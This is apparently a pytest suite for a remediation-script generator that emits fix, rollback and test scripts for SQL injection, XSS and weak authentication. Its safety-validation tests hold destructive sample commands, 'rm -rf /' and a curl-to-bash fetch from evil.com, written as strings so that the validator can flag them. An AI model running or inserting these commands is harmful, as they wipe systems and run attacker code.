"""
Comprehensive tests for Script Generator Module
Target: 100% test coverage
"""

import pytest
import re
import sys
import os
from unittest.mock import Mock, patch, mock_open

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from modules.script_generator import (
    ScriptGenerator,
    ScriptLanguage,
    VulnerabilityType,
    ScriptMetadata,
    GeneratedScript
)


class TestScriptGenerator:
    """Test suite for ScriptGenerator class"""
    
    @pytest.fixture
    def generator(self):
        """Create a ScriptGenerator instance"""
        return ScriptGenerator()
    
    # ============================================================================
    # INITIALIZATION TESTS
    # ============================================================================
    
    def test_initialization(self, generator):
        """Test generator initializes with correct default statistics"""
        stats = generator.get_statistics()
        
        assert stats["scripts_generated"] == 0
        assert stats["safety_violations"] == 0
        assert stats["rollbacks_created"] == 0
        assert "python" in stats["languages"]
        assert "bash" in stats["languages"]
        assert "powershell" in stats["languages"]
        assert "sql_injection" in stats["vulnerability_types"]
    
    # ============================================================================
    # SQL INJECTION REMEDIATION TESTS
    # ============================================================================
    
    def test_generate_sql_injection_python(self, generator):
        """Test SQL injection remediation script generation for Python"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.5,
            context={"file_path": "/app/database.py"}
        )
        
        # Check result structure
        assert isinstance(result, GeneratedScript)
        assert result.remediation_script
        assert result.rollback_script
        assert result.test_script
        assert isinstance(result.metadata, ScriptMetadata)
        assert isinstance(result.safety_warnings, list)
        assert result.execution_notes
        
        # Check remediation script content
        assert "SQL Injection Remediation" in result.remediation_script
        assert "backup_file" in result.remediation_script
        assert "fix_sql_injection" in result.remediation_script
        assert "/app/database.py" in result.remediation_script
        assert "parameterized queries" in result.remediation_script
        
        # Check metadata
        assert result.metadata.language == ScriptLanguage.PYTHON
        assert result.metadata.vulnerability_type == VulnerabilityType.SQL_INJECTION
        assert result.metadata.cvss_score == 8.5
        assert result.metadata.target_system == "Ubuntu 22.04"
        assert result.metadata.safety_checked is True
        assert result.metadata.has_rollback is True
        assert len(result.metadata.checksum) == 64  # SHA-256 hex
        
        # Check statistics updated
        stats = generator.get_statistics()
        assert stats["scripts_generated"] == 1
        assert stats["languages"]["python"] == 1
        assert stats["vulnerability_types"]["sql_injection"] == 1
        assert stats["rollbacks_created"] == 1
    
    def test_generate_sql_injection_bash(self, generator):
        """Test SQL injection remediation script generation for Bash"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.BASH,
            target_system="CentOS 8",
            cvss_score=7.5,
            context={"file_path": "/var/www/app.php"}
        )
        
        # Check bash-specific content
        assert "#!/bin/bash" in result.remediation_script
        assert "set -euo pipefail" in result.remediation_script
        assert "/var/www/app.php" in result.remediation_script
        assert "prepared statements" in result.remediation_script
        assert "SELECT|INSERT|UPDATE|DELETE" in result.remediation_script
        
        # Check rollback script
        assert "#!/bin/bash" in result.rollback_script
        assert "backup" in result.rollback_script.lower()
        
        # Check metadata
        assert result.metadata.language == ScriptLanguage.BASH
        assert result.metadata.cvss_score == 7.5
    
    # ============================================================================
    # XSS REMEDIATION TESTS
    # ============================================================================
    
    def test_generate_xss_python(self, generator):
        """Test XSS remediation script generation for Python"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=6.5,
            context={"file_path": "/app/views.py"}
        )
        
        # Check XSS-specific content
        assert "XSS Remediation" in result.remediation_script
        assert "add_xss_protection" in result.remediation_script
        assert "X-XSS-Protection" in result.remediation_script
        assert "Content-Security-Policy" in result.remediation_script
        assert "Flask" in result.remediation_script or "template" in result.remediation_script
        
        # Check execution notes mention XSS
        assert "xss" in result.execution_notes.lower()
        assert result.metadata.vulnerability_type == VulnerabilityType.XSS
    
    # ============================================================================
    # WEAK AUTHENTICATION REMEDIATION TESTS
    # ============================================================================
    
    def test_generate_weak_auth_python(self, generator):
        """Test weak authentication remediation script generation"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.WEAK_AUTH,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={"file_path": "/app/auth.py"}
        )
        
        # Check authentication-specific content
        assert "Weak Authentication Remediation" in result.remediation_script
        assert "upgrade_authentication" in result.remediation_script
        assert "bcrypt" in result.remediation_script
        assert "hash_password" in result.remediation_script
        assert "verify_password" in result.remediation_script
        
        # Check it warns about weak hashing
        assert "MD5" in result.remediation_script or "SHA1" in result.remediation_script
        
        # Check execution notes mention authentication
        assert "authentication" in result.execution_notes.lower()
        assert result.metadata.vulnerability_type == VulnerabilityType.WEAK_AUTH
    
    # ============================================================================
    # GENERIC TEMPLATE TESTS
    # ============================================================================
    
    def test_generate_generic_template(self, generator):
        """Test generic template for unsupported vulnerability/language combinations"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.CSRF,
            language=ScriptLanguage.BASH,
            target_system="Ubuntu 22.04",
            cvss_score=5.0,
            context={}
        )
        
        # Check generic template used
        assert "generic template" in result.remediation_script.lower()
        assert "manual customization required" in result.remediation_script.lower()
        assert VulnerabilityType.CSRF.value in result.remediation_script
        
        # Still should have rollback and test scripts
        assert result.rollback_script
        assert result.test_script
    
    # ============================================================================
    # ROLLBACK SCRIPT TESTS
    # ============================================================================
    
    def test_rollback_script_python(self, generator):
        """Test rollback script generation for Python"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=7.0,
            context={}
        )
        
        rollback = result.rollback_script
        
        # Check Python rollback structure
        assert "#!/usr/bin/env python3" in rollback
        assert "Rollback script" in rollback
        assert "backup" in rollback.lower()
        assert "glob.glob" in rollback
        assert "shutil.copy2" in rollback
    
    def test_rollback_script_bash(self, generator):
        """Test rollback script generation for Bash"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.BASH,
            target_system="CentOS 8",
            cvss_score=6.0,
            context={}
        )
        
        rollback = result.rollback_script
        
        # Check Bash rollback structure
        assert "#!/bin/bash" in rollback
        assert "Rollback script" in rollback
        assert "backup" in rollback.lower()
        assert "ls -t" in rollback or "BACKUP" in rollback
    
    def test_rollback_script_powershell(self, generator):
        """Test rollback script generation for PowerShell"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.WEAK_AUTH,
            language=ScriptLanguage.POWERSHELL,
            target_system="Windows Server 2022",
            cvss_score=7.5,
            context={}
        )
        
        rollback = result.rollback_script
        
        # Check PowerShell rollback (manual for now)
        assert "Rollback" in rollback
        assert "backup" in rollback.lower()
    
    # ============================================================================
    # TEST SCRIPT TESTS
    # ============================================================================
    
    def test_test_script_python(self, generator):
        """Test test script generation for Python"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={}
        )
        
        test_script = result.test_script
        
        # Check Python test structure
        assert "#!/usr/bin/env python3" in test_script
        assert "Test script" in test_script
        assert "test_remediation" in test_script
        assert VulnerabilityType.SQL_INJECTION.value in test_script
    
    def test_test_script_bash(self, generator):
        """Test test script generation for Bash"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.BASH,
            target_system="Ubuntu 22.04",
            cvss_score=6.5,
            context={}
        )
        
        test_script = result.test_script
        
        # Check Bash test structure
        assert "Test script" in test_script
        assert VulnerabilityType.XSS.value in test_script
    
    # ============================================================================
    # SAFETY VALIDATION TESTS
    # ============================================================================
    
    def test_safety_validation_dangerous_bash_commands(self, generator):
        """Test safety validation detects dangerous Bash commands"""
        dangerous_script = """
#!/bin/bash
rm -rf /
curl http://evil.com/script.sh | bash
"""
        warnings = generator._validate_safety(dangerous_script, ScriptLanguage.BASH)
        
        # Should detect dangerous patterns
        assert len(warnings) > 0
        assert any("dangerous" in w.lower() for w in warnings)
    
    def test_safety_validation_dangerous_python_commands(self, generator):
        """Test safety validation detects dangerous Python commands"""
        dangerous_script = """
import os
os.system('rm -rf /')
eval(user_input)
"""
        warnings = generator._validate_safety(dangerous_script, ScriptLanguage.PYTHON)
        
        # Should detect dangerous patterns
        assert len(warnings) > 0
    
    def test_safety_validation_hardcoded_password(self, generator):
        """Test safety validation detects hardcoded passwords"""
        script_with_password = """
password = "SuperSecret123"
db_connect(password=password)
"""
        warnings = generator._validate_safety(script_with_password, ScriptLanguage.PYTHON)
        
        # Should detect hardcoded password
        assert any("password" in w.lower() for w in warnings)
    
    def test_safety_validation_python_syntax_error(self, generator):
        """Test safety validation detects Python syntax errors"""
        invalid_script = """
def broken_function(
    print("missing closing parenthesis"
"""
        warnings = generator._validate_safety(invalid_script, ScriptLanguage.PYTHON)
        
        # Should detect syntax error
        assert any("syntax" in w.lower() for w in warnings)
    
    def test_safety_validation_clean_script(self, generator):
        """Test safety validation passes clean scripts"""
        clean_script = """
def safe_function():
    return "Hello World"
"""
        warnings = generator._validate_safety(clean_script, ScriptLanguage.PYTHON)
        
        # Should have no warnings
        assert len(warnings) == 0
    
    # ============================================================================
    # EXECUTION NOTES TESTS
    # ============================================================================
    
    def test_execution_notes_high_risk(self, generator):
        """Test execution notes for high-risk vulnerabilities"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Production Server",
            cvss_score=9.5,
            context={}
        )
        
        notes = result.execution_notes
        
        # Check high-risk content
        assert "HIGH" in notes
        assert "CVSS: 9.5" in notes
        assert "BEFORE EXECUTION" in notes
        assert "backup" in notes.lower()
        assert "staging" in notes.lower()
        assert "ROLLBACK" in notes
    
    def test_execution_notes_medium_risk(self, generator):
        """Test execution notes for medium-risk vulnerabilities"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.PYTHON,
            target_system="Test Server",
            cvss_score=5.0,
            context={}
        )
        
        notes = result.execution_notes
        
        # Check medium-risk content
        assert "MEDIUM" in notes
        assert "CVSS: 5.0" in notes
    
    def test_execution_notes_low_risk(self, generator):
        """Test execution notes for low-risk vulnerabilities"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.CONFIG_ERROR,
            language=ScriptLanguage.BASH,
            target_system="Dev Server",
            cvss_score=2.5,
            context={}
        )
        
        notes = result.execution_notes
        
        # Check low-risk content
        assert "LOW" in notes
        assert "CVSS: 2.5" in notes
    
    # ============================================================================
    # METADATA TESTS
    # ============================================================================
    
    def test_metadata_generation(self, generator):
        """Test metadata is correctly generated"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.WEAK_AUTH,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=7.5,
            context={}
        )
        
        metadata = result.metadata
        
        # Check all metadata fields
        assert metadata.language == ScriptLanguage.PYTHON
        assert metadata.vulnerability_type == VulnerabilityType.WEAK_AUTH
        assert metadata.cvss_score == 7.5
        assert metadata.target_system == "Ubuntu 22.04"
        assert metadata.generated_at
        assert metadata.safety_checked is True
        assert metadata.has_rollback is True
        assert len(metadata.checksum) == 64  # SHA-256
    
    def test_checksum_uniqueness(self, generator):
        """Test that different scripts have different checksums"""
        result1 = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={"file_path": "/app/db1.py"}
        )
        
        result2 = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={"file_path": "/app/views.py"}
        )
        
        # Checksums should be different
        assert result1.metadata.checksum != result2.metadata.checksum
    
    # ============================================================================
    # STATISTICS TESTS
    # ============================================================================
    
    def test_statistics_tracking(self, generator):
        """Test statistics are correctly tracked"""
        # Generate multiple scripts
        generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={}
        )
        
        generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.BASH,
            target_system="CentOS 8",
            cvss_score=6.5,
            context={}
        )
        
        generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=7.5,
            context={}
        )
        
        stats = generator.get_statistics()
        
        # Check statistics
        assert stats["scripts_generated"] == 3
        assert stats["languages"]["python"] == 2
        assert stats["languages"]["bash"] == 1
        assert stats["vulnerability_types"]["sql_injection"] == 2
        assert stats["vulnerability_types"]["xss"] == 1
        assert stats["rollbacks_created"] == 3
    
    def test_statistics_safety_violations(self, generator):
        """Test safety violations are tracked in statistics"""
        # Create a dangerous script that will trigger warnings
        with patch.object(generator, '_validate_safety') as mock_validate:
            mock_validate.return_value = ["Warning 1", "Warning 2"]
            
            generator.generate_remediation_script(
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                language=ScriptLanguage.PYTHON,
                target_system="Ubuntu 22.04",
                cvss_score=8.0,
                context={}
            )
        
        stats = generator.get_statistics()
        assert stats["safety_violations"] == 2
    
    # ============================================================================
    # MULTI-LANGUAGE TESTS
    # ============================================================================
    
    def test_all_languages_supported(self, generator):
        """Test all script languages are supported"""
        for language in ScriptLanguage:
            result = generator.generate_remediation_script(
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                language=language,
                target_system="Test System",
                cvss_score=7.0,
                context={}
            )
            
            assert result.remediation_script
            assert result.rollback_script
            assert result.test_script
            assert result.metadata.language == language
    
    # ============================================================================
    # VULNERABILITY TYPE TESTS
    # ============================================================================
    
    def test_all_vulnerability_types_generate_scripts(self, generator):
        """Test all vulnerability types can generate scripts"""
        for vuln_type in VulnerabilityType:
            result = generator.generate_remediation_script(
                vulnerability_type=vuln_type,
                language=ScriptLanguage.PYTHON,
                target_system="Test System",
                cvss_score=6.0,
                context={}
            )
            
            assert result.remediation_script
            assert result.metadata.vulnerability_type == vuln_type
    
    # ============================================================================
    # CONTEXT HANDLING TESTS
    # ============================================================================
    
    def test_context_file_path_included(self, generator):
        """Test that context file paths are included in scripts"""
        custom_path = "/custom/path/to/file.py"
        
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=8.0,
            context={"file_path": custom_path}
        )
        
        assert custom_path in result.remediation_script
    
    def test_empty_context_handled(self, generator):
        """Test that empty context doesn't cause errors"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.XSS,
            language=ScriptLanguage.PYTHON,
            target_system="Ubuntu 22.04",
            cvss_score=6.5,
            context={}
        )
        
        assert result.remediation_script
        assert result.metadata
    
    def test_none_context_handled(self, generator):
        """Test that None context is handled gracefully"""
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.WEAK_AUTH,
            language=ScriptLanguage.BASH,
            target_system="CentOS 8",
            cvss_score=7.0,
            context=None
        )
        
        assert result.remediation_script
        assert result.metadata
    
    # ============================================================================
    # INTEGRATION TESTS
    # ============================================================================
    
    def test_complete_workflow(self, generator):
        """Test complete workflow: generate, validate, get stats"""
        # Generate a script
        result = generator.generate_remediation_script(
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            language=ScriptLanguage.PYTHON,
            target_system="Production Ubuntu 22.04",
            cvss_score=9.0,
            context={"file_path": "/app/critical.py"}
        )
        
        # Verify all components
        assert result.remediation_script
        assert result.rollback_script
        assert result.test_script
        assert result.metadata
        assert isinstance(result.safety_warnings, list)
        assert result.execution_notes
        
        # Verify metadata
        assert result.metadata.language == ScriptLanguage.PYTHON
        assert result.metadata.vulnerability_type == VulnerabilityType.SQL_INJECTION
        assert result.metadata.cvss_score == 9.0
        assert result.metadata.safety_checked is True
        
        # Verify statistics updated
        stats = generator.get_statistics()
        assert stats["scripts_generated"] > 0
        assert stats["rollbacks_created"] > 0
    
    def test_multiple_scripts_independence(self, generator):
        """Test that generating multiple scripts doesn't interfere with each other"""
        results = []
        
        for i in range(5):
            result = generator.generate_remediation_script(
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                language=ScriptLanguage.PYTHON,
                target_system=f"Server-{i}",
                cvss_score=7.0 + i * 0.5,
                context={"file_path": f"/app/file{i}.py"}
            )
            results.append(result)
        
        # Verify all results are unique
        checksums = [r.metadata.checksum for r in results]
        assert len(checksums) == len(set(checksums))  # All unique
        
        # Verify statistics
        stats = generator.get_statistics()
        assert stats["scripts_generated"] == 5


class TestEnums:
    """Test enum classes"""
    
    def test_script_language_enum(self):
        """Test ScriptLanguage enum values"""
        assert ScriptLanguage.PYTHON.value == "python"
        assert ScriptLanguage.BASH.value == "bash"
        assert ScriptLanguage.POWERSHELL.value == "powershell"
        
        # Test all languages
        languages = [lang.value for lang in ScriptLanguage]
        assert "python" in languages
        assert "bash" in languages
        assert "powershell" in languages
    
    def test_vulnerability_type_enum(self):
        """Test VulnerabilityType enum values"""
        assert VulnerabilityType.SQL_INJECTION.value == "sql_injection"
        assert VulnerabilityType.XSS.value == "xss"
        assert VulnerabilityType.CSRF.value == "csrf"
        assert VulnerabilityType.WEAK_AUTH.value == "weak_authentication"
        
        # Test all vulnerability types
        vuln_types = [v.value for v in VulnerabilityType]
        assert len(vuln_types) == 10  # We have 10 vulnerability types


class TestDataClasses:
    """Test dataclass structures"""
    
    def test_script_metadata_creation(self):
        """Test ScriptMetadata dataclass"""
        metadata = ScriptMetadata(
            language=ScriptLanguage.PYTHON,
            vulnerability_type=VulnerabilityType.SQL_INJECTION,
            cvss_score=8.5,
            target_system="Ubuntu 22.04",
            generated_at="2025-10-18T12:00:00",
            safety_checked=True,
            has_rollback=True,
            checksum="abc123"
        )
        
        assert metadata.language == ScriptLanguage.PYTHON
        assert metadata.vulnerability_type == VulnerabilityType.SQL_INJECTION
        assert metadata.cvss_score == 8.5
        assert metadata.target_system == "Ubuntu 22.04"
        assert metadata.safety_checked is True
        assert metadata.has_rollback is True
    
    def test_generated_script_creation(self):
        """Test GeneratedScript dataclass"""
        metadata = ScriptMetadata(
            language=ScriptLanguage.BASH,
            vulnerability_type=VulnerabilityType.XSS,
            cvss_score=6.5,
            target_system="CentOS 8",
            generated_at="2025-10-18T12:00:00",
            safety_checked=True,
            has_rollback=True,
            checksum="def456"
        )
        
        script = GeneratedScript(
            remediation_script="#!/bin/bash\necho test",
            rollback_script="#!/bin/bash\necho rollback",
            test_script="#!/bin/bash\necho test",
            metadata=metadata,
            safety_warnings=["warning1"],
            execution_notes="Execute carefully"
        )
        
        assert script.remediation_script
        assert script.rollback_script
        assert script.test_script
        assert script.metadata == metadata
        assert len(script.safety_warnings) == 1
        assert script.execution_notes


# Run tests
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
